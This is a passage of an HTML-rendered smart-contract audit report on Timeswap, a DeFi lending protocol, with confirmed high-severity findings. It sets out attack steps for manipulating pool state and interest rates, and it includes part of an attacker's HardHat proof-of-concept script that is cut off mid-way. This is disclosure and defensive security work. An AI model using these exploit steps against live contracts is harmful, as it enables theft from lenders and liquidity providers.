class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minimum</span><span class=\"mtk1\"> *= </span><span class=\"mtk12\">xDecrease</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">state</span><span class=\"mtk1\">.</span><span class=\"mtk12\">x</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">xDecrease</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minimum</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">minimum</span><span class=\"mtk1\">.</span><span class=\"mtk11\">divUp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">denominator</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_collateralIn</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">minimum</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">collateralIn</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_collateralIn</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toUint112</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h4 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<p>Near the maturity time, the attacker can do the following:</p>\n<ol>\n<li><code>borrow()</code> a dust amount of assets (<code>xDecrease</code> = 1 wei) and increase <code>pool.state.z</code> to an extremely large value (20x of previous <code>state.z</code> in our tests);</li>\n<li><code>pay()</code> the loan and get back the collateral;</li>\n<li><code>lend()</code> a regular amount of <code>state.x</code>, get a large amount of insurance token;</li>\n<li><code>burn()</code> the insurance token and get a large portion of the collateral assets from the defaulted loans.</li>\n</ol>\n<h4 id=\"recommendation\" style=\"position:relative;\"><a href=\"#recommendation\" aria-label=\"recommendation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h4>\n<p>Consider making <code>pair.borrow()</code> to be <code>onlyConvenience</code>, so that <code>zIncrease</code> will be a computed value (based on <code>xDecrease</code> and current state) rather than a user input value.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/162\">Mathepreneur (Timeswap) confirmed</a></strong></p>\n<h2 id=\"h-02-timeswapconveniencesolborrowgivendebt-attacker-can-increase-statey-to-an-extremely-large-value-with-a-dust-amount-of-assetout\" style=\"position:relative;\"><a href=\"#h-02-timeswapconveniencesolborrowgivendebt-attacker-can-increase-statey-to-an-extremely-large-value-with-a-dust-amount-of-assetout\" aria-label=\"h 02 timeswapconveniencesolborrowgivendebt attacker can increase statey to an extremely large value with a dust amount of assetout permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/169\">[H-02] <code>TimeswapConvenience.sol#borrowGivenDebt()</code> Attacker can increase <code>state.y</code> to an extremely large value with a dust amount of <code>assetOut</code></a></h2>\n<p><em>Submitted by WatchPug</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/BorrowMath.sol#L19-L53\">https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/BorrowMath.sol#L19-L53</a></p>\n<p>This issue is similar to the two previous issues related to <code>state.y</code> manipulation. Unlike the other two issues, this function is not on <code>TimeswapPair.sol</code> but on <code>TimeswapConvenience.sol</code>, therefore this can not be solved by adding <code>onlyConvenience</code> modifier.</p>\n<p>Actually, we believe that it does not make sense for the caller to specify the interest they want to pay, we recommend removing this function.</p>\n<h4 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h4>\n<ul>\n<li>When <code>pool.state.y</code> is extremely large, many core features of the protocol will malfunction, as the arithmetic related to <code>state.y</code> can overflow. For example:</li>\n</ul>\n<p>LendMath.check(): <a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/LendMath.sol#L28-L28\">https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/LendMath.sol#L28-L28</a></p>\n<p>BorrowMath.check(): <a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L31-L31\">https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L31-L31</a></p>\n<ul>\n<li>An attacker can set <code>state.y</code> to a near overflow value, then <code>lend()</code> to get a large amount of extra interest (as Bond tokens) with a small amount of asset tokens. This way, the attacker can steal funds from other lenders and liquidity providers.</li>\n</ul>\n<p><strong><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/169\">Mathepreneur (Timeswap) confirmed</a></strong></p>\n<h2 id=\"h-03-manipulation-of-the-y-state-results-in-interest-rate-manipulation\" style=\"position:relative;\"><a href=\"#h-03-manipulation-of-the-y-state-results-in-interest-rate-manipulation\" aria-label=\"h 03 manipulation of the y state results in interest rate manipulation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/187\">[H-03] Manipulation of the Y State Results in Interest Rate Manipulation</a></h2>\n<p><em>Submitted by Rhynorater, also found by harleythedog, hyh, and WatchPug</em></p>\n<p>Due to lack of constraints on user input in the <code>TimeswapPair.sol#mint</code> function, an attacker can arbitrarily modify the interest rate while only paying a minimal amount of Asset Token and Collateral Token.</p>\n<p>Disclosure: This is my first time attempting Ethereum hacking, so I might have made some mistakes here since the math is quite complex, but I’m going to give it a go.</p>\n<h4 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<p>The attack scenario is this: A malicious actor is able to hyper-inflate the interest rate on a pool by triggering a malicious mint function. The malicious actor does this to attack the LP and other members of the pool.</p>\n<p>Consider the following HardHat script:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hre</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;hardhat&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//jtok is asset</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//usdc is collat</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">launchTestTokens</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenDeployer</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//Launch a token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TestToken</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractFactory</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;TestToken&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">signer</span><span class=\"mtk1\">=</span><span class=\"mtk12\">tokenDeployer</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tt</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TestToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deploy</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;JTOK&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;JTOK&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1000000000000000</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tt2</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TestToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deploy</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;USDC&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;USDC&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1000000000000000</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">res</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tt</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenDeployer</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">res2</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tt</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenDeployer</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;JTOK balance: &quot;</span><span class=\"mtk1\">+</span><span class=\"mtk12\">res</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;USDC balance: &quot;</span><span class=\"mtk1\">+</span><span class=\"mtk12\">res2</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> [</span><span class=\"mtk12\">tt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tt2</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deployAttackersContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">, </span><span class=\"mtk12\">jtok</span><span class=\"mtk1\">, </span><span class=\"mtk12\">usdc</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Att</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractFactory</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Attacker&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">signer</span><span class=\"mtk1\">=</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">atakcontrak</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Att</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deploy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">jtok</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">usdc</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">atakcontrak</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deployLPContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">jtok</span><span class=\"mtk1\">, </span><span class=\"mtk12\">usdc</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">LP</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractFactory</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;LP&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">signer</span><span class=\"mtk1\">=</span><span class=\"mtk12\">lp</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lpc</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">LP</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deploy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">jtok</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">usdc</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lpc</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">main</span><span class=\"mtk1\">() {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> [</span><span class=\"mtk12\">tokenDeployer</span><span class=\"mtk1\">, </span><span class=\"mtk12\">lp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">] = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getSigners</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenDeployer</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getBalance</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">factory</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractAt</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;TimeswapFactory&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;0x5FbDB2315678afecb367f032d93F642f64180aa3&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">signer</span><span class=\"mtk1\">=</span><span class=\"mtk12\">tokenDeployer</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//let [jtok, usdc] = await launchTestTokens(tokenDeployer)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">jtok</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractAt</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;TestToken&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;0x2279b7a0a67db372996a5fab50d91eaa73d2ebe6&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">signer</span><span class=\"mtk1\">=</span><span class=\"mtk12\">tokenDeployer</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">usdc</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractAt</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;TestToken&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;0x8a791620dd6260079bf849dc5567adc3f2fdc318&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">signer</span><span class=\"mtk1\">=</span><span class=\"mtk12\">tokenDeployer</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Jtok: &quot;</span><span class=\"mtk1\">+</span><span class=\"mtk12\">jtok</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;USDC: &quot;</span><span class=\"mtk1\">+</span><span class=\"mtk12\">usdc</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//Create Pair</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//let txn = await factory.createPair(jtok.address, usdc.address)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">pairAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getPair</span><span class=\"mtk1\">(</span><span class=\"mtk12\">jtok</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">usdc</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">pair</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractAt</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;TimeswapPair&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">pairAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">signer</span><span class=\"mtk1\">=</span><span class=\"mtk12\">tokenDeployer</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Pair address: &quot;</span><span class=\"mtk1\">+</span><span class=\"mtk12\">pairAddress</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Deploy LP</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//let lpc = await deployLPContract(lp, jtok, usdc)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lpc</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractAt</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;LP&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;0x948b3c65b89df0b4894abe91e6d02fe579834f8f&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">signer</span><span class=\"mtk1\">=</span><span class=\"mtk12\">lp</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">jtokb</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">jtok</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lpc</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> 